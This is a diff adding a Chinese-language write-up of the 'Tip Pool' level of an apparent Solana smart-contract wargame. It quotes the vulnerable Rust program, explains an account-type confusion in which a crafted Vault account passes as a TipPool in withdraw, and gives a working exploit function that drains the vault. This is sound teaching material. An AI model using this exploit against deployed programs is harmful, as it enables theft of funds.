@@ -286,3 +286,189 @@ fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
 
 - [Data Types - The Rust Programming Language](https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow)
 - [anchor - How to avoid SendTransactionError "This transaction has already been processed" - Solana Stack Exchange](https://solana.stackexchange.com/a/1178)
+
+## Level 3 - Tip Pool
+
+- 查看 `TipInstruction`，初步了解程序的功能，任何人可以创建 `TipPool` 来接收 tips，资金存储在 `Vault` 中，`withdraw` 时将依据 `TipPool` 中存储的 `value`
+
+    ```rs
+    pub enum TipInstruction {
+        /// Initialize a vault
+        ///
+        /// Passed accounts:
+        ///
+        /// (1) Vault account
+        /// (2) initializer (must sign)
+        /// (3) Rent sysvar
+        /// (4) System Program
+        Initialize {
+            seed: u8,
+            fee: f64,
+            fee_recipient: Pubkey,
+        },
+        /// Initialize a TipPool
+        ///
+        /// Passed accounts:
+        ///
+        /// (1) Vault account
+        /// (2) withdraw_authority (must sign)
+        /// (3) Pool account
+        CreatePool,
+        /// Tip
+        ///
+        /// Passed accounts:
+        ///
+        /// (1) Vault account
+        /// (2) Pool
+        /// (3) Tip Source
+        /// (4) System program
+        Tip { amount: u64 },
+        /// Withdraw from Pool
+        ///
+        /// Passed accounts:
+        ///
+        /// (1) Vault account
+        /// (2) Pool account
+        /// (3) withdraw_authority (must sign)
+        Withdraw { amount: u64 },
+    }
+    ```
+
+- 两种账户类型，`Vault` 和 `TipPool`，注意到 `Vault` 的字段恰好能覆盖 `TipPool` 的字段
+    - `deserialize` 根据给定数据类型解析，并更新 buffer，使其指向剩余字节
+    
+    ```rs
+    pub struct TipPool {
+        pub withdraw_authority: Pubkey, // Vault::creator
+        pub value: u64, // Vault::fee
+        pub vault: Pubkey, // Vault::fee_recipient
+    }
+
+    pub struct Vault {
+        pub creator: Pubkey,
+        pub fee: f64,
+        pub fee_recipient: Pubkey,
+        pub seed: u8,
+    }
+    ```
+
+- `withdraw` 中未检查 `pool_info` 是否是 `TipPool` 类型的数据，因而可以传入 `Vault` 类型的数据
+
+    ```rs
+    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
+        let account_info_iter = &mut accounts.iter();
+        let vault_info = next_account_info(account_info_iter)?;
+        let pool_info = next_account_info(account_info_iter)?;
+        let withdraw_authority_info = next_account_info(account_info_iter)?;
+        let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;
+
+        assert_eq!(vault_info.owner, program_id);
+        assert_eq!(pool_info.owner, program_id);
+        assert!(
+            withdraw_authority_info.is_signer,
+            "withdraw authority must sign"
+        );
+        assert_eq!(pool.vault, *vault_info.key);
+        assert_eq!(*withdraw_authority_info.key, pool.withdraw_authority);
+
+        pool.value = match pool.value.checked_sub(amount) {
+            Some(v) => v,
+            None => return Err(ProgramError::InvalidArgument),
+        };
+
+        **(*vault_info).lamports.borrow_mut() -= amount;
+        **(*withdraw_authority_info).lamports.borrow_mut() += amount;
+
+        pool.serialize(&mut &mut pool_info.data.borrow_mut()[..]).unwrap();
+
+        Ok(())
+    }
+    ```
+
+- 通过 `initialize` 来控制 `Vault` 类型账户各个字段的值，并使用 `Vault` 类型的账户来代替 `TipPool` 进行 `withdraw`
+
+    ```rs
+    fn initialize(
+        program_id: &Pubkey,
+        accounts: &[AccountInfo],
+        seed: u8,
+        fee: f64,
+        fee_recipient: Pubkey,
+    ) -> ProgramResult {
+        let account_info_iter = &mut accounts.iter();
+        let vault_info = next_account_info(account_info_iter)?;
+        let initializer_info = next_account_info(account_info_iter)?;
+        let rent_info = next_account_info(account_info_iter)?;
+        let rent = Rent::from_account_info(rent_info)?;
+        // 使用不同的 seed 来获取不同的 vault_address
+        let vault_address = Pubkey::create_program_address(&[&[seed]], program_id).unwrap();
+
+        assert_eq!(*vault_info.key, vault_address);
+        assert!(
+            vault_info.data_is_empty(),
+            "vault info must be empty account!"
+        );
+        assert!(initializer_info.is_signer, "initializer must sign!");
+
+        invoke_signed(
+            &system_instruction::create_account(
+                &initializer_info.key,
+                &vault_address,
+                rent.minimum_balance(VAULT_LEN as usize),
+                VAULT_LEN,
+                &program_id,
+            ),
+            &[initializer_info.clone(), vault_info.clone()],
+            &[&[&[seed]]],
+        )?;
+
+        let vault = Vault {
+            creator: *initializer_info.key,
+            fee,
+            fee_recipient,
+            seed,
+        };
+
+        vault.serialize(&mut &mut vault_info.data.borrow_mut()[..]).unwrap();
+
+        Ok(())
+    }
+    ```
+
+### Exploit
+
+```rs
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    let pool: TipPool = env.get_deserialized_account(challenge.tip_pool).unwrap();
+    let seed = 1;
+    let hacker_vault = Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
+    
+    env.execute_as_transaction(
+        &[level3::initialize(
+            challenge.tip_program,
+            hacker_vault,   // new vault
+            challenge.hacker.pubkey(),  // creator <-> withdraw_authority
+            seed,
+            pool.value as f64,  // fee <-> value
+            challenge.vault_address // fee_recipient <-> vault
+        )],
+        &[&challenge.hacker],
+    ).print_named("Hacker: initialize vault");
+    env.execute_as_transaction(
+        &[level3::withdraw(
+            challenge.tip_program,
+            challenge.vault_address,
+            hacker_vault,
+            challenge.hacker.pubkey(),
+            pool.value,
+        )],
+        &[&challenge.hacker]
+    ).print_named("Hacker: withdraw");
+}
+```
+
+### 参考资料
+
+- [Solana Smart Contracts: Common Pitfalls and How to Avoid Them](https://blog.neodyme.io/posts/solana_common_pitfalls/#solana-account-confusions)
+- [BorshDeserialize in borsh::de - Rust](https://docs.rs/borsh/latest/borsh/de/trait.BorshDeserialize.html)
+- [Program Derived Addresses (PDAs) | Solana Cookbook](https://solanacookbook.com/core-concepts/pdas.html)
